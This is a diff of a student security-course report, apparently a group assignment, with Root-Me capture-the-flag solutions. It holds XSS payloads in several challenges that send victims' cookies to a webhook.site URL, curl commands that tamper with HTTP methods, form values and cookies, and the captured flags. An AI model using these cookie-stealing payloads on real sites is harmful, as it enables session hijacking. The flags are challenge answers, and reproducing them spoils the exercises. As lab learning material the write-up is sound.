@@ -10,8 +10,8 @@ date: 2025-04-28
 
 > [!Example] Gruppe
 > Mohammed Ali Al-Saiaf - 310320
-> Nico Roth -
-> Nokha Temarbulatov - 
+> Nico Roth - 302552
+> Nokha Temarbulatov - 310576
 
 ## 1. Web Application Vulnerabilities (Without Time Constraints)
 
@@ -48,11 +48,35 @@ then convert it to character codes and use it in this payload:
 and then appending it in the `name` parameter and sending it through contact gave the flag through the **webhook** site
 
 ---
-**Challenge 4:** [XSS Stored - 2](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2)
+**Challenge 4:** [XSS - Reflected](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)
+Because the admin doesn't click on any links, we tried many links, and finally we found a vulnerability, where the link sent us to a page where we can report a bug to the administrator using:
 ```
-"><script>document.write(%22<img src=https://webhook.site/8ed6a099-e13d-4c5c-8676-ba38b3e1c3b9?%22.concat(document.cookie.replace(%22 %22,%22&%22)).concat(%22 />%22))</script>
+http://challenge01.root-me.org/web-client/ch26/?p=exp' onmouseover='document.write(%22<img src=https://webhook.site/8ed6a099-e13d-4c5c-8676-ba38b3e1c3b9?%22.concat(document.cookie).concat(%22 />%22))
+```
+where we used **webhook** site to get the cookie of the admin.
+
+---
+**Challenge 5:** [XSS - Stored 2](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2)
+First we discovered the vulnerability by changing the parameter status from `invite` to 
+```html
+invite"><img src=1 onerror="window.location='https://webhook.site/8ed6a099-e13d-4c5c-8676-ba38b3e1c3b9?cookie='+document.cookie" />
+```
+So, this tag gives immediate error for not loading the image and sends the cookie to the webhook.
+After that we get `ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F`. We insert a new cookie called `ADMIN_COOKIE` with that value and refresh. After that we get the flag in the admin section.
+
+---
+**Challenge 6:** [XSS DOM based - Eval](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Eval)
+First we discovered the vulnerability by examining the calculator functionality which passes user input through an eval() function. The input needs to satisfy a regex that requires a valid calculation format like `1+1`.
+
+We crafted a payload that starts with a valid calculation and then uses the JavaScript comma operator to execute our malicious code:
+```js
+1+1,location=`https://webhook.site/8ed6a099-e13d-4c5c-8676-ba38b3e1c3b9?cookie=${document.cookie}`
 ```
 
+When this payload is passed to the calculation parameter, the eval() function first calculates 1+1 and then redirects to our webhook with the cookie data. Parentheses are blocked by the site, so we used template literals (backticks) to avoid traditional function calls.
+After loading the URL with our payload, the page redirected to our webhook, sending the admin cookie.
+
+---
 #### 1.3. Solve 5 of the challenges in the category Challenges => Web-Server that have a name starting with "HTTP". \[Groups: All challenges starting with “HTTP”\]
 
 **Challenge 1:** [HTTP - IP restriction bypass](https://www.root-me.org/en/Challenges/Web-Server/HTTP-IP-restriction-bypass)
@@ -141,8 +165,88 @@ and then somehow got:
 </html>
 ```
 
+---
+**Challenge 6:** [HTTP - POST](https://www.root-me.org/en/Challenges/Web-Server/HTTP-POST)
+When opening the challenge page, we see this form:
+```html
+<form action="" method="post" onsubmit="document.getElementsByName('score')[0].value = Math.floor(Math.random() * 1000001)">
+  <input type="hidden" name="score" value="-1" />
+  <input type="submit" name="generate" value="Give a try!">
+</form>
+```
+The form uses JavaScript to set a random `score` (0–1,000,000) before submitting.  
+Since validation is **client-side**, we can bypass it by sending a custom POST request.
+
+Using browser devtools, we copied the cURL command, modified `score=1000000`, and sent it via terminal:
+```sh
+curl -X POST -d "score=1000000&generate=Give+a+try%21" "http://challenge01.root-me.org/web-serveur/ch56/"
+```
+The response:
+```html
+<p>Wow, 1000000! How did you do that? :o</p>
+<p>Flag to validate the challenge: <strong>H7tp_h4s_N0_s3Cr37S_F0r_y0U</strong></p>
+```
 
 ---
+**Challenge 7:** [HTTP - Improper redirect](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Improper-redirect)
+When opening the challenge page, we see a login form. After submitting random credentials, there’s a redirect.
+
+We ran:
+```sh
+curl -i "http://challenge01.root-me.org/web-serveur/ch32/"
+```
+and got:
+```txt
+HTTP/1.1 302 Found
+Location: ./login.php?redirect
+```
+plus the full HTML content, including:
+```html
+<p>The flag is : ExecutionAfterRedirectIsBad</p>
+```
+
+The trick is that the server redirects, but forgets to stop PHP execution (`exit()` missing), so the flag is leaked after the redirect.
+
+---
+**Challenge 8:** [HTTP - Verb tampering](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Verbs-tampering)
+When opening the challenge page, the access is denied, likely due to restricted HTTP methods.
+
+We sent a request with the `OPTIONS` method:
+```sh
+curl -X OPTIONS "http://challenge01.root-me.org/web-serveur/ch8/"
+```
+and received:
+```html
+<h1>Mot de passe / password : a23e$dme96d3saez$$prap</h1>
+```
+
+The server only blocks GET/POST, but OPTIONS still works.  
+
+---
+**Challenge 9:** [HTTP - Cookies](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Cookies)
+When opening the challenge page, we see a form to submit an email and a "Saved email addresses" link, but clicking it says "You need to be admin".
+
+In the HTML code, we found:
+```html
+<!--SetCookie("ch7","visiteur");-->
+```
+hinting at a cookie.
+
+First, we sent a POST request to get the visitor cookie:
+```sh
+curl -i -X POST -d "mail=test@example.com&jsep4b=send" "http://challenge01.root-me.org/web-serveur/ch7/"
+```
+Then manually set the cookie to `admin`:
+```sh
+curl -i -b "ch7=admin" "http://challenge01.root-me.org/web-serveur/ch7/?c=admin"
+```
+and got:
+```html
+<div>Validation password : ml-SYMPA</div>
+```
+
+---
+
 ## 2. Access Control Implementation: Access Control Lists
 #### How are access control lists (DACL) evaluated in Microsoft Windows?
 Windows checks DACLs by going through ACEs one by one, top to bottom. It applies the first matching deny or allow rule it finds. Denies are stronger if they come earlier. If nothing matches, access is denied.
